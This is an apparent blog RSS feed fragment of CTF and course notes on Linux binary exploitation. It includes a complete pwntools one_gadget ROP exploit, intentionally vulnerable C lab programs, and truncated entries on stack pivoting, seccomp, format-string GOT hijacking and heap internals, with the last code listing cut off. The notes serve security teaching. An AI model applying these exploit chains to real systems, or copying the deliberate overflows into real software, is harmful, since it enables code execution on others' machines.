&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;h2 id="one_gadget-background">
 one_gadget background
 &lt;a class="anchor" href="#one_gadget-background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10226977">Day25: [Misc] 我從來沒想過我會害怕寫 code&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>原理是在 &lt;code>glibc&lt;/code> 裡面有很多會透過 &lt;code>execve&lt;/code> 執行 &lt;code>/bin/sh&lt;/code>、再調用外部系統指令的 assembly，當 explolit 已經得知 &lt;code>libc&lt;/code> 的位之後而且可以控制 RIP 之後，就可以直接跳該位置達成 shell out，不需要再辛苦堆 stack 上的參數&lt;/p>&lt;/blockquote>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

int main()
{
 setvbuf(stdin, 0, _IONBF, 0);
 setvbuf(stdout, 0, _IOBNF, 0);

 char s[0x10];

 printf(&amp;#34;Your libc: %p&amp;#34;, printf);
 read(0, s, 0x100);

 return 0;
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>The program has buffer overflow, however it has no backdoor method can access and has no global variable can write shellcode. Thus, we can consider to use &lt;code>ROP&lt;/code> to get shell.&lt;/li>
&lt;li>Note that, it must be a dynamic library, so DO NOT use &lt;code>-static&lt;/code> to compile it.
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">gcc -o one_gadget_with_rop one_gadget_with_rop.c -no-pie -fno-stack-protector -z norelro -zexecstack
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>First, we use &lt;a href="https://shengyu7697.github.io/linux-ldd/">&lt;font color="FF0000">&lt;code>ldd&lt;/code>&lt;/font>&lt;/a> command to find what library the program will use.
&lt;img src="https://imgur.com/ycRb8Tv.png" alt="" />&lt;/li>
&lt;li>In addition, we use &lt;code>one_gadget&lt;/code> command to find &lt;code>execvs&lt;/code>
&lt;ul>
&lt;li>Note that, how to use it can refer to &lt;a href="https://blog.csdn.net/weixin_43092232/article/details/105085880">one_gadget用法&lt;/a>&lt;/li>
&lt;li>We use &lt;code>0xebcf8 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)&lt;/code> as our method
&lt;img src="https://imgur.com/Y7BBH5J.png" alt="" />
&lt;ul>
&lt;li>&lt;font color="FF0000">Note:&lt;/font> it has 3 constraint so that we can get the shell&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">address rbp-0x78 is writable
[rsi] == NULL || rsi == NULL
[rdx] == NULL || rdx == NULL
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Then, we use &lt;code>one_gadget&lt;/code> command to get &lt;code>ROP&lt;/code> chain
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">ROPgadget --binary one_gadget_with_rop --only &amp;#34;pop|ret&amp;#34; &amp;gt; one_gadget
vim one_gadget
&lt;/code>&lt;/pre>You can see that because we didn&amp;rsquo;t compile with library, the gadget that we may can use is very few.
&lt;img src="https://imgur.com/DuGINHL.png" alt="" />
The solution is using the gadget that &lt;code>libc&lt;/code> have:
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &amp;#34;pop|ret&amp;#34; &amp;gt; one_gadget
$ vim one_gadget
&lt;/code>&lt;/pre>We must satisfied one_gadget constraint. &lt;code>0x90529&lt;/code> and &lt;code>0x2be51&lt;/code> are the offset of &lt;code>/lib/x86_64-linux-gnu/libc.so.6&lt;/code>. Therefore, if we want to call these gadget, &lt;font color="FF0000">we must find out the real base address of &lt;code>/lib/x86_64-linux-gnu/libc.so.6&lt;/code>&lt;/font>.
&lt;img src="https://imgur.com/3h5PqcO.png" alt="" />
&lt;img src="https://imgur.com/Z2bBbhJ.png" alt="" />&lt;/li>
&lt;li>Because, &lt;code>ASLR&lt;/code> is turn on in default, so the address of library will be random, we just know the offset of library. In original code, it told us the &lt;code>printf&lt;/code> address in &lt;code>/lib/x86_64-linux-gnu/libc.so.6&lt;/code> → &lt;font color="FF0000">&lt;code>0x7ffff7def770&lt;/code>&lt;/font>
&lt;img src="https://imgur.com/nuYGx24.png" alt="" />
Used &lt;code>gdb&lt;/code> can find the current address of library → &lt;font color="FF0000">&lt;code>0x7ffff7d8f000&lt;/code>&lt;/font>
&lt;img src="https://imgur.com/Et3r2hI.png" alt="" />
Then we can know the offset and construct apart of payload as below
$$0x7ffff7def770 - 0x7ffff7d8f000 = 0x60770$$
&lt;pre tabindex="0">&lt;code class="language-python!=" data-lang="python!=">from pwn import *
import sys

context.arch = &amp;#39;amd64&amp;#39;

r = process(&amp;#39;./one_gadget_with_rop&amp;#39;)

r.recvuntil(&amp;#34;Your libc: &amp;#34;)
libc = int(r.recv(14), 16) - 0x60770
info(f&amp;#34;libc: {hex(libc)}&amp;#34;)
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>And prepare our gadget:
&lt;pre tabindex="0">&lt;code class="language-python!=11" data-lang="python!=11">pop_rdx_rbx_ret = libc + 0x90529
pop_rsi_ret = libc + 0x2be51
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>Construct whole payload with considering the constraint:
&lt;pre tabindex="0">&lt;code class="language-python!=13" data-lang="python!=13">r.send(b&amp;#39;a&amp;#39;*0x10 + p64(0x404000) + p64(pop_rdx_rbx_ret) + p64(0)*2 + p64(pop_rsi_ret) + p64(0) + p64(libc+0xebcf8))
r.interactivae()
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>b'a'*0x10&lt;/code> is for &lt;code>$rsi&lt;/code>&lt;/li>
&lt;li>&lt;code>p64(0x404000)&lt;/code> is an arbitrary writable and readable address for &lt;code>$rbp-0x78&lt;/code> one of the constraint of one_gadget&lt;/li>
&lt;li>&lt;code>p64(pop_rdx_rbx_ret) + p64(0)*2 + p64(pop_rsi_ret) + p64(0)&lt;/code> is what we did in &lt;a href="https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/rki3GF0cs">last lecture&lt;/a> of &lt;code>ROP&lt;/code>&lt;/li>
&lt;li>&lt;code>p64(libc+0xebcf8)&lt;/code> is the one_gadget that we choose at the beginning.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Finally, we got shell!!!
&lt;img src="https://imgur.com/iIETaBy.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://shengyu7697.github.io/linux-ldd/">Linux ldd 查看執行檔執行時需要哪些 library&lt;/a>
&lt;a href="https://youtu.be/ktoVQB99Gj4">Pwn week1&lt;/a>&lt;/p></description></item><item><title>Simple PWN - 0x09(stack pivoting)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x09stack-pivoting/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x09stack-pivoting/</guid><description>&lt;h1 id="simple-pwn---0x09stack-pivoting">
 Simple PWN - 0x09(stack pivoting)
 &lt;a class="anchor" href="#simple-pwn---0x09stack-pivoting">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;h2 id="stack-pivoting-background">
 Stack Pivoting background
 &lt;a class="anchor" href="#stack-pivoting-background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/iA4Hrr17ooI?t=6865">NTUSTISC - Pwn Basic 3 [2019.03.26]&lt;/a>
&lt;a href="https://youtu.be/ktoVQB99Gj4?t=7898">Pwn week1&lt;/a>
It was used when stack overflow bytes not big enough to access a shellcode but it has another lots of writable space can be accessed.
More detailed info. can refer to &lt;a href="https://youtu.be/5D7tvxpSUUM?t=9543">Binary Exploitation (Pwn)&lt;/a>&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-cpp!" data-lang="cpp!">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

char name[0x80]

int main()
{
 setvbuf(stdin, 0, _IONBF, 0);
 setvbuf(stdout, 0, _IONBF, 0);

 char s[0x10];

 printf(&amp;#34;Give me your name: &amp;#34;);
 read(0, name, 0x80);

 printf(&amp;#34;Give me your ROP: &amp;#34;);
 read(0, s, 0x20);

 return 0;
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>You can observe that it has not much stack buffer overflow can use, but it has global variable &lt;code>name&lt;/code> with space &lt;code>0x80&lt;/code>(can be another stack)
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">gcc -o stack_pivoting stack_pivoting.c -no-pie -fno-stack-protector -z norelro -zexecstack -static
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>&lt;font color="FF0000">Note that&lt;/font>:
must use &lt;code>mprotect&lt;/code> to change permission of global variable &lt;code>name&lt;/code> just like &lt;a href="https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/HJhgXGKci">lecture 0x04&lt;/a>, add these line in original code
&lt;pre tabindex="0">&lt;code class="language-c!" data-lang="c!">#include &amp;lt;sys/mman.h&amp;gt;
mprotect(0x403000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC);
&lt;/code>&lt;/pre>&lt;strong>Before &lt;code>mprotect&lt;/code> - &lt;code>vmmap&lt;/code>&lt;/strong>
&lt;img src="https://imgur.com/z8cK5SM.png" alt="" />
&lt;img src="https://imgur.com/J6qKJ8N.png" alt="" />
&lt;strong>After &lt;code>mprotect&lt;/code> - &lt;code>vmmap&lt;/code>&lt;/strong>
&lt;img src="https://imgur.com/gNr8Fya.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Construct &lt;code>ROP&lt;/code> chain&lt;/p></description></item><item><title>Simple PWN - 0x10(`seccomp`/Lab - `rop2win`)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x10seccomp_lab---rop2win/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x10seccomp_lab---rop2win/</guid><description>&lt;h1 id="simple-pwn---0x10seccomplab---rop2win">
 Simple PWN - 0x10(&lt;code>seccomp&lt;/code>/Lab - &lt;code>rop2win&lt;/code>)
 &lt;a class="anchor" href="#simple-pwn---0x10seccomplab---rop2win">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>challenge: &lt;code>nc edu-ctf.zoolab.org 10005&lt;/code>&lt;/p>
&lt;h2 id="seccomp-background">
 &lt;code>seccomp&lt;/code> background
 &lt;a class="anchor" href="#seccomp-background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/ktoVQB99Gj4?t=8457">Pwn week1&lt;/a>&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;seccomp.h&amp;gt;

char fn[0x20];
char ROP[0x100];


// fd = open(&amp;#34;flag&amp;#34;, 0);
// read(fd, buf, 0x30);
// write(1, buf, 0x30); // 1 --&amp;gt; stdout

int main()
{
 setvbuf(stdin, 0, _IONBF, 0);
 setvbuf(stdout, 0, _IONBF, 0);

 scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
 seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
 seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
 seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
 seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
 seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
 seccomp_load(ctx);
 seccomp_release(ctx);

 printf(&amp;#34;Give me filename: &amp;#34;);
 read(0, fn, 0x20);

 printf(&amp;#34;Give me ROP: &amp;#34;);
 read(0, ROP, 0x100);

 char overflow[0x10];
 printf(&amp;#34;Give me overflow: &amp;#34;);
 read(0, overflow, 0x30);

 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN - 0x11(format string bug)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x11format-string-bug/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x11format-string-bug/</guid><description>&lt;h1 id="simple-pwn---0x11format-string-bug">
 Simple PWN - 0x11(format string bug)
 &lt;a class="anchor" href="#simple-pwn---0x11format-string-bug">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;h2 id="format-string-bug-background">
 format string bug background
 &lt;a class="anchor" href="#format-string-bug-background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.geeksforgeeks.org/g-fact-31/">printf %n&lt;/a>
&lt;img src="https://media.geeksforgeeks.org/wp-content/cdn-uploads/20191009172738/n-in-printf.jpg" alt="" />&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

int main()
{
 setvbuf(stdin, 0, _IONBF, 0);
 setvbuf(stdout, 0, _IONBF, 0);

 char fmt[0x20];

 system(&amp;#34;echo &amp;#39;Give me fmt: &amp;#39;&amp;#34;);
 read(0, fmt, 0x20);
 printf(fmt);

 system(&amp;#34;echo &amp;#39;Give me string: &amp;#39;&amp;#34;);
 read(0, fmt, 0x20);
 puts(fmt);

 return 0;
}
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ gcc -o fmt fmt.c -no-pie -fno-stack-protector -z norelro -zexecstack
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>In this problem, we can consider to use &lt;code>format string bug&lt;/code> to achieve &lt;code>GOT hijacking&lt;/code> without buffer overflow.&lt;/li>
&lt;li>&lt;strong>The main idea is totally the same as &lt;a href="https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/S1BBpSR5s">GOT hijacking lecture&lt;/a>&lt;/strong>&lt;/li>
&lt;li>Thus, we can observe which function can be overlapped by &lt;code>system plt&lt;/code> → &lt;font color="FF0000">&lt;strong>&lt;code>puts function&lt;/code>&lt;/strong>&lt;/font>
&lt;ul>
&lt;li>Because&amp;hellip;
&lt;code>puts&lt;/code> just needs one argument like &lt;code>system&lt;/code> function, but how about &lt;code>printf&lt;/code>?
Unfortunately, it appeared before 2nd read function, because 2nd &lt;code>read&lt;/code> needs to store the argument for &lt;code>system&lt;/code> function such as &lt;code>sh\x00&lt;/code>.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="exploit---got-hijacking--format-string-bug">
 Exploit - GOT hijacking + format string bug
 &lt;a class="anchor" href="#exploit---got-hijacking--format-string-bug">#&lt;/a>
&lt;/h2>
&lt;p>&lt;strong>Our goal is hijack &lt;code>puts GOT&lt;/code> to &lt;code>system plt&lt;/code>&lt;/strong>&lt;/p></description></item><item><title>Simple PWN - 0x12(Lab - `rop++`)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x12lab---rop++/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x12lab---rop++/</guid><description>&lt;h1 id="simple-pwn---0x12lab---rop">
 Simple PWN - 0x12(Lab - &lt;code>rop++&lt;/code>)
 &lt;a class="anchor" href="#simple-pwn---0x12lab---rop">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>challenge: &lt;code>nc edu-ctf.zoolab.org 10004&lt;/code>&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int main()
{
 char buf[0x10];
 const char *msg = &amp;#34;show me rop\n&amp;gt; &amp;#34;;

 write(1, msg, strlen(msg));
 read(0, buf, 0x200);

 return 0;
}
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code class="language-makefile!" data-lang="makefile!">gcc -fno-stack-protector -static -o chal rop++.c
&lt;/code>&lt;/pre>&lt;h2 id="analyze">
 Analyze
 &lt;a class="anchor" href="#analyze">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>Obviously buffer overflow!!!&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Check protector&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ checksec chal
[*] &amp;#39;/home/sbk6401/NTUCS/PWN/Lab/rop++/share/chal&amp;#39;
 Arch: amd64-64-little
 RELRO: Partial RELRO
 Stack: Canary found
 NX: NX enabled
 PIE: No PIE (0x400000)
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>Preliminary idea is using &lt;code>ROP&lt;/code> chain and get shell, but the problem is where can I write &lt;code>/bin/sh\x00&lt;/code>? We can use &lt;code>vmmap&lt;/code> to observe where section is writable and readable → &lt;code>0x4c5000~0x4c800&lt;/code>
&lt;img src="https://imgur.com/018Nk8F.png" alt="" />&lt;/p></description></item><item><title>Simple PWN - 0x13(Lab - `how2know`)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x13lab---how2know/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x13lab---how2know/</guid><description>&lt;h1 id="simple-pwn---0x13lab---how2know">
 Simple PWN - 0x13(Lab - &lt;code>how2know&lt;/code>)
 &lt;a class="anchor" href="#simple-pwn---0x13lab---how2know">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>challenge: &lt;code>nc edu-ctf.zoolab.org 10002&lt;/code>
Environment Version: 22.04&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;seccomp.h&amp;gt;
#include &amp;lt;sys/mman.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

static char flag[0x30];

int main()
{
 void *addr;
 int fd;
 scmp_filter_ctx ctx;

 addr = mmap(NULL, 0x1000, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
 if ((unsigned long)addr == -1)
 perror(&amp;#34;mmap&amp;#34;), exit(1);
 
 fd = open(&amp;#34;/home/chal/flag&amp;#34;, O_RDONLY);
 if (fd == -1)
 perror(&amp;#34;open&amp;#34;), exit(1);
 read(fd, flag, 0x30);
 close(fd);

 write(1, &amp;#34;talk is cheap, show me the code\n&amp;#34;, 33);
 read(0, addr, 0x1000);

 ctx = seccomp_init(SCMP_ACT_KILL);
 seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
 seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
 seccomp_load(ctx);
 seccomp_release(ctx);

 ((void(*)())addr)();

 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN - 0x14(Simple HEAP)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x14simple-heap/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x14simple-heap/</guid><description>&lt;h1 id="simple-pwn---0x14simple-heap">
 Simple PWN - 0x14(Simple HEAP)
 &lt;a class="anchor" href="#simple-pwn---0x14simple-heap">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="heap-background">
 HEAP background
 &lt;a class="anchor" href="#heap-background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/rMqvL9j0QaM">Advanced Binary Exploitation (Pwn) - Heap Exploitation&lt;/a>
&lt;a href="https://youtu.be/Xppj8lA04qQ">SS111-Pwn2&lt;/a>&lt;/p>
&lt;h2 id="allocate-a-memory">
 Allocate a memory
 &lt;a class="anchor" href="#allocate-a-memory">#&lt;/a>
&lt;/h2>
&lt;h3 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h3>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

int main()
{
 void *ptr;
 ptr = malloc(0x30);
 return 0;
}
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ sudo gcc -o simple_heap simple_heap.c -no-pie
&lt;/code>&lt;/pre>&lt;h3 id="analyze">
 Analyze
 &lt;a class="anchor" href="#analyze">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>Before executing &lt;code>malloc&lt;/code>, there is no &lt;code>heap&lt;/code> space in memory layout
&lt;img src="https://imgur.com/h9ibSyk.png" alt="" />&lt;/p></description></item><item><title>Simple PWN - 0x15(Lab - `heapmath`)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x15lab---heapmath/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x15lab---heapmath/</guid><description>&lt;h1 id="simple-pwn---0x15lab---heapmath">
 Simple PWN - 0x15(Lab - &lt;code>heapmath&lt;/code>)
 &lt;a class="anchor" href="#simple-pwn---0x15lab---heapmath">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;time.h&amp;gt;

int main()
{
 setvbuf(stdin, 0, _IONBF, 0);
 setvbuf(stdout, 0, _IONBF, 0);
 srand(time(NULL));

 void *tcache_chk[7] = {0};
 unsigned char tcachebin[3][7] = {0}; // 0x20, 0x30, 0x40
 unsigned int tcachebin_counts[4] = {0};
 unsigned long tcache_size[7] = {0};
 unsigned long tcache_free_order[7] = {0};

 puts(&amp;#34;----------- ** tcache chall ** -----------&amp;#34;);
 unsigned long tmp = 0;
 for (int i = 0; i &amp;lt; 7; i++) {
 tmp = (rand() % 0x21) + 0x10; // 0x10 ~ 0x30
 tcache_size[i] = tmp;
 }

 for (int i = 0; i &amp;lt; 7; i++) {
 repeat:
 tmp = rand() % 7;
 for (int j = 0; j &amp;lt; i; j++)
 if (tmp == tcache_free_order[j]) goto repeat;
 tcache_free_order[i] = tmp;
 }

 for (int i = 0; i &amp;lt; 7; i++) {
 tcache_chk[i] = malloc( tcache_size[i] );
 printf(&amp;#34;char *%c = (char *) malloc(0x%lx);\n&amp;#34;, &amp;#39;A&amp;#39; + i, tcache_size[i]);
 }

 for (int i = 0; i &amp;lt; 7; i++) {
 int idx = tcache_free_order[i];
 free(tcache_chk[ idx ]);
 printf(&amp;#34;free(%c);\n&amp;#34;, &amp;#39;A&amp;#39; + (unsigned char) idx);

 tmp = tcache_size[ idx ] - 0x8;
 if (tmp % 0x10)
 tmp = (tmp &amp;amp; ~0xf) + 0x20;
 else
 tmp += 0x10;

 unsigned int binidx = ((tmp - 0x20) / 0x10);
 unsigned int bincnt = tcachebin_counts[ binidx ];
 tcachebin[ binidx ][ bincnt ] = &amp;#39;A&amp;#39; + (unsigned char) idx;
 tcachebin_counts[ binidx ]++;
 }

 char tmpbuf[0x100] = {0};
 char ansbuf[3][0x100] = {0};
 for (int i = 0; i &amp;lt; 3; i++) {
 for (int j = 6; j &amp;gt;= 0; j--)
 if (tcachebin[i][j]) {
 sprintf(tmpbuf, &amp;#34;%c --&amp;gt; &amp;#34;, tcachebin[i][j]);
 strcat(ansbuf[i], tmpbuf);
 }
 strcat(ansbuf[i], &amp;#34;NULL&amp;#34;);
 }
 puts(&amp;#34;&amp;#34;);
 for (int i = 0; i &amp;lt; 3; i++) {
 printf(&amp;#34;[chunk size] 0x%x: &amp;#34;, (i+2) * 0x10);
 if (i == 0) {
 printf(&amp;#34;%s\t(just send \&amp;#34;%s\&amp;#34;)\n&amp;#34;, ansbuf[i], ansbuf[i]);
 } else {
 printf(&amp;#34;?\n&amp;gt; &amp;#34;);
 fgets(tmpbuf, 0x100, stdin);
 if (!strncmp(tmpbuf, ansbuf[i], strlen(ansbuf[i]))) {
 puts(&amp;#34;Correct !&amp;#34;);
 } else {
 puts(&amp;#34;Wrong !&amp;#34;);
 printf(&amp;#34;Ans: \&amp;#34;%s\&amp;#34;\n&amp;#34;, ansbuf[i]);
 exit(0);
 }
 }
 }

 puts(&amp;#34;\n----------- ** address chall ** -----------&amp;#34;);
 int cmp1 = 0;
 int cmp2 = 0;
 unsigned long ans_addr = 0;

 cmp1 = rand() % 7;
 while ((cmp2 = rand() % 7) == cmp1);
 if (cmp1 &amp;gt; cmp2) {
 tmp = cmp1;
 cmp1 = cmp2;
 cmp2 = tmp;
 }

 printf(&amp;#34;assert( %c == %p );\n&amp;#34;, &amp;#39;A&amp;#39; + cmp1, tcache_chk[ cmp1 ]);
 printf(&amp;#34;%c == ?\t(send as hex format, e.g. \&amp;#34;%p\&amp;#34;)\n&amp;gt; &amp;#34;,
 &amp;#39;A&amp;#39; + cmp2, tcache_chk[ cmp1 ]);
 scanf(&amp;#34;%s&amp;#34;, tmpbuf);
 ans_addr = strtoul(tmpbuf, NULL, 16);

 if (ans_addr == (unsigned long) tcache_chk[ cmp2 ]) {
 puts(&amp;#34;Correct !&amp;#34;);
 } else {
 puts(&amp;#34;Wrong !&amp;#34;);
 printf(&amp;#34;Ans: %p\n&amp;#34;, tcache_chk[ cmp2 ]);
 exit(0);
 }

 puts(&amp;#34;\n----------- ** index chall ** -----------&amp;#34;);
 unsigned long *fastbin[2] = {0};
 unsigned long fastbin_size = 0;
